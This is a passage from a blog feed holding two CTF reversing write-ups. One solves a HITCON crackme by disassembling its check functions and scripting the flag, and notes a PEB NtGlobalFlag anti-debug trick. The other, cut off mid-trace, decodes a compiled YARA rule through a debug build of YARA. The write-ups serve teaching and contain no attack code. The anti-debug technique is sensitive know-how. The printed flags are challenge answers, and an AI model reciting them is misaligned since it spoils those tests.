</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x</span><span class="si">%x</span><span class="s2">:</span><span class="se">\t</span><span class="si">%s</span><span class="se">\t</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">i</span><span class="o">.</span><span class="n">mnemonic</span><span class="p">,</span> <span class="n">i</span><span class="o">.</span><span class="n">op_str</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">dat</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;meow_way.exe&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">dat</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb</span><span class="s2">&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;H1&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;#############################&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">disasm</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xcb\xc3</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
</span></span></code></pre></div><p>and we can notice that some of these functions are not adding the value, but substracting:</p>
<pre tabindex="0"><code>% python disasm64.py| more
[....]

#############################
0x1000:	xor	rax, rax
0x1003:	mov	rax, qword ptr gs:[rax + 0x60]
0x1008:	movzx	rax, byte ptr [rax + 2]
0x100d:	mov	ecx, dword ptr [esp + 0x1c]
0x1012:	mov	dword ptr [ecx], eax
0x1015:	test	eax, eax
0x1017:	jne	0x1031
0x1019:	mov	edi, dword ptr [esp + 4]
0x101e:	mov	esi, dword ptr [esp + 0xc]
0x1023:	mov	ecx, dword ptr [esp + 0x14]
0x1028:	add	cl, byte ptr [esi]                  &lt;-- ADD
0x102b:	xor	cl, 0x9f
0x102e:	mov	byte ptr [edi], cl
0x1031:	call	0x1036
0x1036:	mov	dword ptr [rsp + 4], 0x23
0x103e:	add	dword ptr [rsp], 0xd
#############################
0x1000:	xor	rax, rax
0x1003:	mov	rax, qword ptr gs:[rax + 0x60]
0x1008:	movzx	rax, byte ptr [rax + 2]
0x100d:	mov	ecx, dword ptr [esp + 0x1c]
0x1012:	mov	dword ptr [ecx], eax
0x1015:	test	eax, eax
0x1017:	jne	0x1031
0x1019:	mov	edi, dword ptr [esp + 4]
0x101e:	mov	esi, dword ptr [esp + 0xc]
0x1023:	mov	ecx, dword ptr [esp + 0x14]
0x1028:	sub	cl, byte ptr [esi]                  &lt;--- SUB
0x102b:	xor	cl, 0xd0
0x102e:	mov	byte ptr [edi], cl
0x1031:	call	0x1036
0x1036:	mov	dword ptr [rsp + 4], 0x23
0x103e:	add	dword ptr [rsp], 0xd
[...]
</code></pre><p>At this point we know all the information we need to get in order to find the flag:</p>
<ul>
<li>the memcmp array it&rsquo;s checked against</li>
<li>the XOR value hardcoded in each function</li>
<li>the operation performed by each function (SUB or ADD)</li>
<li>the value parameter passed to the functions</li>
</ul>
<h2 id="31-the-memcmp-array">3.1 The memcmp array</h2>
<p>easy, it&rsquo;s in the code:</p>
<pre tabindex="0"><code>[ 0x96, 0x50, 0xcf, 0x2c, 0xeb, 0x9b, 0xaa, 0xfb, 0x53, 0xab, 0x73, 0xdd, 0x6c, 0x9e, 0xdb, 0xbc, 0xee, 0xab, 0x23, 0xd6, 0x16, 0xfd, 0xf1, 0xf0, 0xb9, 0x75, 0xc3, 0x28, 0xa2, 0x74, 0x7d,
0xe3, 0x27, 0xd5, 0x95, 0x5c, 0xf5, 0x76, 0x75, 0xc9, 0x8c, 0xfb, 0x42, 0x0e, 0xbd, 0x51, 0xa2, 0x98 ]
</code></pre><h2 id="32-the-xor-values">3.2 The XOR values</h2>
<p>just grep them:</p>
<pre tabindex="0"><code>% python disasm64.py | egrep &#34;xor.*cl&#34; | cut -d, -f2 | xargs | tr &#34; &#34; &#34;,&#34;
0xba,0x2f,0xcd,0xf6,0x9f,0xd0,0x22,0xf7,0xd0,0x1f,0xa8,0x3d,0xc7,0xa5,0x47,0x68,0xd7,0x4a,0x96,0x91,0x2e,0x19,0xc5,0xe3,0x88,0xbd,0x4e,0x93,0x13,0xf1,0xcc,0x47,0xab,0xc9,0x48,0x2b,9,0x50,0x4f,0xe9,0xc0,0x5e,0xef,0x8b,0x85,0xcb,0x55,0x70
</code></pre><h2 id="33-the-operations">3.3 The operations</h2>
<p>grep them too:</p>
<pre tabindex="0"><code>% python disasm64.py| egrep &#34;(add|sub).*cl&#34; | cat -n | grep sub | awk &#39;{ print $1-1}&#39; | xargs | tr &#34; &#34; &#34;,&#34;
5,7,10,11,14,17,19,25,28,29,34,35,37,39,40,42,43,44,45,47
</code></pre><p>for character 5, 7, 10, &hellip; it&rsquo;s doing a sub, for the others, an add.</p>
<h2 id="34-the-parameter-values">3.4 The parameter values.</h2>
<p>Just copy the ghidra decompiler output of the main function to a file:</p>
<pre tabindex="0"><code>% cat bla.txt
    (*DAT_0040544c)(argv1,(int)argv1 &gt;&gt; 0x1f,argv1,(int)argv1 &gt;&gt; 0x1f,0xc4,0,&amp;local_10,(int)&amp;local_10 &gt;&gt; 0x1f);
    chr = argv1 + 1;
    (*DAT_004053a8)(chr,(int)chr &gt;&gt; 0x1f,chr,(int)chr &gt;&gt; 0x1f,0x16,0,&amp;local_10,(int)&amp;local_10 &gt;&gt; 0x1f);
    chr = argv1 + 2;
    (*DAT_004053b4)(chr,(int)chr &gt;&gt; 0x1f,chr,(int)chr &gt;&gt; 0x1f,0x8e,0,&amp;local_10,(int)&amp;local_10 &gt;&gt; 0x1f);
    chr = argv1 + 3;
    (*DAT_004053f0)(chr,(int)chr &gt;&gt; 0x1f,chr,(int)chr &gt;&gt; 0x1f,0x77,0,&amp;local_10,(int)&amp;local_10 &gt;&gt; 0x1f);
// etc....
</code></pre><p>and get the values:</p>
<pre tabindex="0"><code>% cat bla.txt| grep DAT | cut -d, -f 5 | xargs | tr &#34; &#34; &#34;,&#34;
0xc4,0x16,0x8e,0x77,5,0xb9,0xd,0x6b,0x24,0x55,0x12,0x35,0x76,0xe7,0xfb,0xa0,0xda,0x34,0x84,0xb4,200,0x9b,0xef,0xb4,0xb9,10,0x57,0x5c,0xfe,0xc5,0x6a,0x73,0x49,0xbd,0x11,0xd6,0x8f,0x6b,10,0x97,0xab,0x4e,0xed,0xfe,0x97,0xf9,0x98
</code></pre><h1 id="4-the-solution">4. The solution</h1>
<p>Put all these arrays in a python script and watch the flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># xor values</span>
</span></span><span class="line"><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0xcd</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0xf7</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">,</span><span class="mh">0x3d</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0xa5</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0xd7</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x91</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x19</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x4e</span><span class="p">,</span><span class="mh">0x93</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0xf1</span><span class="p">,</span><span class="mh">0xcc</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x2b</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0xe9</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x5e</span><span class="p">,</span><span class="mh">0xef</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0xcb</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x70</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># parameters values</span>
</span></span><span class="line"><span class="cl"><span class="n">param</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xc4</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0x8e</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mh">0xb9</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x6b</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="mh">0xda</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0xb4</span><span class="p">,</span><span class="mi">200</span><span class="p">,</span><span class="mh">0x9b</span><span class="p">,</span><span class="mh">0xef</span><span class="p">,</span><span class="mh">0xb4</span><span class="p">,</span><span class="mh">0xb9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0xc5</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0xd6</span><span class="p">,</span><span class="mh">0x8f</span><span class="p">,</span><span class="mh">0x6b</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x4e</span><span class="p">,</span><span class="mh">0xed</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mh">0x98</span><span class="p">,</span><span class="mh">0x65</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># memcmp</span>
</span></span><span class="line"><span class="cl"><span class="n">memcmp</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x9b</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0xdd</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x9e</span><span class="p">,</span><span class="mh">0xdb</span><span class="p">,</span><span class="mh">0xbc</span><span class="p">,</span><span class="mh">0xee</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0xd6</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mh">0xfd</span><span class="p">,</span><span class="mh">0xf1</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">,</span><span class="mh">0xb9</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xc3</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x27</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x95</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">,</span><span class="mh">0xf5</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x8c</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0x42</span><span class="p">,</span><span class="mh">0x0e</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x98</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># index of &#39;sub&#39; functions</span>
</span></span><span class="line"><span class="cl"><span class="n">subs</span> <span class="o">=</span> <span class="p">[</span><span class="mi">5</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">47</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">subs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">param</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="p">((</span><span class="n">memcmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="p">((</span><span class="n">memcmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="n">param</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span></code></pre></div><p>-&gt; <code>hitcon{___7U5T_4_S1mpIE_xB6_M@G1C_4_mE0w_W@y___}</code></p>
<h1 id="5-bonus">5. Bonus</h1>
<p>Some of the check functions have an alternative anti-debug check:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">gs</span><span class="p">:[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x60</span><span class="p">]</span>  <span class="c1">; PEB
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">movzx</span> <span class="no">rax</span><span class="p">,</span> <span class="no">byte</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0xbc</span><span class="p">]</span>    <span class="c1">; PEB-&gt;NtGlobalFlag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0x1c</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">and</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0x70</span>                   <span class="c1">; FLG_HEAP_ENABLE_TAIL_CHECK|FLG_HEAP_ENABLE_FREE_CHECK|FLG_HEAP_VALIDATE_PARAMETERS
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">mov</span> <span class="no">dword</span> <span class="p">[</span><span class="no">ecx</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">test</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">jne</span> <span class="mi">0x37</span>
</span></span></code></pre></div><p>it tests <code>PEB-&gt;NtGlobalFlag &amp; 0x70</code> to check for the presence of a debugger (more info here: <a href="https://www.aldeid.com/wiki/PEB-Process-Environment-Block/NtGlobalFlag">https://www.aldeid.com/wiki/PEB-Process-Environment-Block/NtGlobalFlag</a>)</p>
]]></content>
		</item>
		
		<item>
			<title>Square CTF 2022: Yet Another Reversing Activity</title>
			<link>https://matth.dmz42.org/posts/2022/squarectf-2022-yet-another-reversing-activity/</link>
			<pubDate>Mon, 21 Nov 2022 14:00:00 +0100</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2022/squarectf-2022-yet-another-reversing-activity/</guid>
			<description>This was one of the reversing challenge during Square CTF, i found it interesting and unusual as it involves YARA.
1. Description Supposedly this file can recognize a flag. But what could it be?
2. Introduction The file given is a compiled YARA rule.
From their website:
YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware samples. With YARA you can create descriptions of malware families (or whatever you want to describe) based on textual or binary patterns.</description>
			<content type="html"><![CDATA[<p>This was one of the reversing challenge during <a href="https://squarectf.com/2022/index.html">Square CTF</a>, i found it interesting and unusual as it involves YARA.</p>
<h1 id="1-description">1. Description</h1>
<p>Supposedly <a href="flag.yarc">this file</a> can recognize a flag. But what could it be?</p>
<h1 id="2-introduction">2. Introduction</h1>
<p>The file given is a compiled <a href="https://github.com/VirusTotal/yara">YARA</a> rule.</p>
<p>From their website:</p>
<p>YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware samples. With YARA you can create descriptions of malware families (or whatever you want to describe) based on textual or binary patterns. Each description, a.k.a. rule, consists of a set of strings and a boolean expression which determine its logic. Let&rsquo;s see an example:</p>
<pre tabindex="0"><code class="language-yara" data-lang="yara">rule silent_banker : banker
{
    meta:
        description = &#34;This is just an example&#34;
        threat_level = 3
        in_the_wild = true

    strings:
        $a = {6A 40 68 00 30 00 00 6A 14 8D 91}
        $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9}
        $c = &#34;UVODFRYSIHLNWPEJXQZAKCBGMT&#34;

    condition:
        $a or $b or $c
}
</code></pre><p>The obvious goal of the challenge is to find a flag that matches the rule in <code>flag.yarc</code>.</p>
<h1 id="3-preparation">3. Preparation</h1>
<p>I tried a YARA decompiler i found somewhere on github but it was kind of old and just didn&rsquo;t work for the version of YARA used for this challenge, so i started to dig in the YARA source code.</p>
<p>Compiled YARA rules apparently contain some kind of bytecode and fortunately for us, there&rsquo;s some debug only waiting to be enabled.</p>
<p>The function <code>yr_execute_code()</code> in <code>libyara/exec.c</code> has all of it:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">yr_execute_code</span><span class="p">(</span><span class="n">YR_SCAN_CONTEXT</span><span class="o">*</span> <span class="n">context</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// cut for brevity
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">stop</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Read the opcode from the address indicated by the instruction pointer.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">opcode</span> <span class="o">=</span> <span class="o">*</span><span class="n">ip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Advance the instruction pointer, which now points past the opcode.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ip</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">OP_NOP</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">YR_DEBUG_FPRINTF</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;- case OP_NOP: // %s()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">__FUNCTION__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">OP_HALT</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">YR_DEBUG_FPRINTF</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;- case OP_HALT: // %s()</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">__FUNCTION__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">assert</span><span class="p">(</span><span class="n">stack</span><span class="p">.</span><span class="n">sp</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>  <span class="c1">// When HALT is reached the stack should be empty.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">stop</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// etc...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>After a few grep here in there, turning debug mode can be done by passing the  <code>--with-debug-verbose=8</code> to the configure script (8 is kind of arbitrary here).</p>
<p>It&rsquo;s best done by editing the <code>build.sh</code> script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>./bootstrap.sh
</span></span><span class="line"><span class="cl">./configure --with-debug-verbose<span class="o">=</span><span class="m">8</span>
</span></span><span class="line"><span class="cl">make
</span></span></code></pre></div><p>then rebuild YARA:</p>
<pre tabindex="0"><code>yara-4.2.3% ./bootstrap.sh
yara-4.2.3% ./build.sh
</code></pre><h1 id="4-solution">4. Solution</h1>
<p>Now that we have our debug build, we can try it on a random file.</p>
<p>We know the flag has a format like <code>flag{....}</code>, so we can use it as a test input file:</p>
<pre tabindex="0"><code>% echo &#34;flag{test}&#34; &gt; test.txt
% ./yara-4.2.3/yara -C flag.yarc test.txt
0.000000 006981 + yr_initialize() {
0.001316 006981   - hash__initialize() {}
0.001332 006981 } // yr_initialize()
0.001434 006981 - yr_scanner_create() {}
0.001485 006981 + yr_scanner_scan_mem(buffer=0x7f91d236d000 buffer_size=11) {
0.001492 006981   + yr_scanner_scan_mem_blocks() {
0.001505 006981     - _yr_get_first_block() {} = 0x7ffc0c7f9650 // default iterator; single memory block, blocking
0.001517 006981     + _yr_scanner_scan_mem_block(block_data=0x7f91d236d000 block-&gt;base=0x0 block-&gt;size=11) {
0.001532 006981     } = 0 AKA ERROR_SUCCESS 0 // _yr_scanner_scan_mem_block()
0.001542 006981     - _yr_get_next_block() {} = (nil) // default iterator; single memory block, blocking
0.001549 006981     - _yr_get_file_size() {} = 11  // default iterator; single memory block, blocking
0.001556 006981     + yr_execute_code() {
0.001576 006981       - case OP_INIT_RULE: // yr_execute_code()
0.001583 006981       - case OP_PUSH_8: r1.i=0 // yr_execute_code()
0.001590 006981       - case OP_INT8: // yr_execute_code()
0.001595 006981       - _yr_get_first_block() {} = 0x7ffc0c7f9650 // default iterator; single memory block, blocking
0.001604 006981       - case OP_PUSH_8: r1.i=95 // yr_execute_code()
0.001612 006981       - case OP_PUSH_8: r1.i=57 // yr_execute_code()
0.001619 006981       - case OP_BITWISE_XOR: // yr_execute_code()
0.001627 006981       - case OP_INT_EQ: // yr_execute_code()
0.001634 006981       - case OP_JFALSE: // yr_execute_code()
0.001642 006981       - case OP_PUSH_8: r1.i=1 // yr_execute_code()
0.001650 006981       - case OP_INT8: // yr_execute_code()
0.001657 006981       - _yr_get_first_block() {} = 0x7ffc0c7f9650 // default iterator; single memory block, blocking
0.001664 006981       - case OP_PUSH_8: r1.i=51 // yr_execute_code()
0.001671 006981       - case OP_PUSH_8: r1.i=95 // yr_execute_code()
0.001678 006981       - case OP_BITWISE_XOR: // yr_execute_code()
0.001685 006981       - case OP_INT_EQ: // yr_execute_code()
0.001693 006981       - case OP_AND: // yr_execute_code()
0.001700 006981       - case OP_JFALSE: // yr_execute_code()
0.001707 006981       - case OP_PUSH_8: r1.i=2 // yr_execute_code()
0.001714 006981       - case OP_INT8: // yr_execute_code()
0.001721 006981       - _yr_get_first_block() {} = 0x7ffc0c7f9650 // default iterator; single memory block, blocking
0.001729 006981       - case OP_PUSH_8: r1.i=248 // yr_execute_code()
0.001741 006981       - case OP_PUSH_8: r1.i=153 // yr_execute_code()
0.001745 006981       - case OP_BITWISE_XOR: // yr_execute_code()
0.001753 006981       - case OP_INT_EQ: // yr_execute_code()
0.001762 006981       - case OP_AND: // yr_execute_code()
0.001767 006981       - case OP_JFALSE: // yr_execute_code()
0.001772 006981       - case OP_PUSH_8: r1.i=3 // yr_execute_code()
0.001777 006981       - case OP_INT8: // yr_execute_code()
0.001782 006981       - _yr_get_first_block() {} = 0x7ffc0c7f9650 // default iterator; single memory block, blocking
0.001790 006981       - case OP_PUSH_8: r1.i=83 // yr_execute_code()
0.001799 006981       - case OP_PUSH_8: r1.i=52 // yr_execute_code()
0.001806 006981       - case OP_BITWISE_XOR: // yr_execute_code()
0.001813 006981       - case OP_INT_EQ: // yr_execute_code()
0.001819 006981       - case OP_AND: // yr_execute_code()
0.001828 006981       - case OP_JFALSE: // yr_execute_code()
0.001839 006981       - case OP_PUSH_8: r1.i=4 // yr_execute_code()
0.001849 006981       - case OP_INT8: // yr_execute_code()
0.001856 006981       - _yr_get_first_block() {} = 0x7ffc0c7f9650 // default iterator; single memory block, blocking
0.001865 006981       - case OP_PUSH_8: r1.i=248 // yr_execute_code()
0.001876 006981       - case OP_PUSH_8: r1.i=131 // yr_execute_code()
0.001885 006981       - case OP_BITWISE_XOR: // yr_execute_code()
0.001892 006981       - case OP_INT_EQ: // yr_execute_code()
0.001899 006981       - case OP_AND: // yr_execute_code()
0.001906 006981       - case OP_JFALSE: // yr_execute_code()
0.001913 006981       - case OP_PUSH_8: r1.i=5 // yr_execute_code()
0.001922 006981       - case OP_INT8: // yr_execute_code()
0.001929 006981       - _yr_get_first_block() {} = 0x7ffc0c7f9650 // default iterator; single memory block, blocking
0.001937 006981       - case OP_PUSH_8: r1.i=154 // yr_execute_code()
0.001944 006981       - case OP_PUSH_8: r1.i=247 // yr_execute_code()
0.001952 006981       - case OP_BITWISE_XOR: // yr_execute_code()
0.001959 006981       - case OP_INT_EQ: // yr_execute_code()
0.001964 006981       - case OP_AND: // yr_execute_code()
